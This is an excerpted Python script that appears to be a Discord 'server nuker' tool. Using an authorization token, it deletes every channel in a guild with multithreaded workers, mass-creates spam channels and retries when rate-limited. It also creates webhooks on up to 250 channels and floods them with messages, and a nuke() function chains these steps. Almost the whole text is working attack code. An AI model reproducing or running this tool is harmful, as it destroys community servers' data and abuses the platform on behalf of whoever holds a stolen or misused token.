...
def check_guild():
    return requests.get(f"https://discord.com/api/v9/guilds/{guild}", headers={"Authorization": token}).status_code == 200

def guild_info():
    try:
        return requests.get(f"https://discord.com/api/v9/guilds/{guild}", headers={"Authorization": token}).json()
    except:
...
def get_channel_ids():
    listing = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels", headers={"Authorization": token}).json()
...
def delchannels():
    ...
    def del_worker():
        while True:
            channel = queue.get()
            response = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers={"Authorization": token})
...
def Spamchannels():
    ...
    if count < max_threads:
        ...
        thread_count = max_threads
    print(f"{c.WH} [ {c.ITAL}{c.RED}SPAMCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Performing MakeChannels with {thread_count} threads making {count} channels.{c.END}")
    def make_worker():
        while True:
            item = queue.get()
            response = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers={"Authorization": token}, json={"name": config['chan_nuke_name'], "type": 0})
            if response.status_code == 201:
                print(f"{c.WH} [ {c.ITAL}{c.RED}SPAMCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Created channel: {response.json()['id']}{c.END}")
            else:
                if response.status_code == 429:
                    queue.put(item)
                print(f"{c.WH} [ {c.ITAL}{c.RED}SPAMCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Failed to create channel: {response.json()['message']}{c.END}")
            queue.task_done()
    start = time.perf_counter()
    for _ in range(thread_count):
        threading.Thread(target=make_worker, daemon=True).start()
    queue.join()
    print(f"{c.WH} [ {c.ITAL}{c.RED}CHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Operation complete, tango down. ({round(time.perf_counter() - start, 2)} seconds){c.END}")
#WebHookspam
def webhooks():
...
def nuke():
    methods = [delchannels, Spamchannels, webhooks]
...
def spam_webhooks(hooks):
    ...
    for _ in range(config['spam_per_webhook']):
        ...
        def spam_worker():
            while True:
                url = queue.get()
                requests.post(url, data={"content": config['webhook_content']}, timeout=5)
                queue.task_done()
...
def create_webhooks():
    ...
    if len(channels) > 250:
        [queue.put(i) for i in channels[:250]]
    else:
    ...
    def make_worker():
        while True:
            channel = queue.get()
            try:
                response = requests.post(f"https://discord.com/api/v9/channels/{channel}/webhooks", headers={"Authorization": token}, json={"name": config['webhook_name']}, timeout=5)
            except:
...
#MAIN 
    ...
    clear()
    print(f"{c.RES} ")
    print(f"{c.WH} [ {c.ITAL}{c.BL}1{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.CY}Webhooks{c.RES}:\t-> {c.ITAL}{c.BL} Spam Webhook.{c.END}")
